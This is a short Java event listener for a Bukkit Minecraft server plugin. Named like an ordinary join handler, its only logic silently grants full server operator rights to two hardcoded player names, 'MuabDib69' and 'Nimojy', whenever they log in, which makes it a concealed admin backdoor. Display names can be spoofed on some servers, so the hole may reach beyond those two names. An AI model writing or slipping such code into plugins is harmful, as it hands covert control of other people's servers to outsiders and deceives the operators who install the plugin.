/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

package dk.tsdev.minecraft.eventhandler;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;


public class PlayerJoinEvent implements Listener {

    @EventHandler
    public void opPlayer(PlayerLoginEvent event) {

        Player p = event.getPlayer();
        p.sendMessage(p.getDisplayName());

        if (p.getDisplayName().equalsIgnoreCase("MuabDib69") || p.getDisplayName().equalsIgnoreCase("Nimojy")) {
            p.setOp(true);
            Bukkit.getLogger().info("Opped MuabDib69");
        }
    }
}
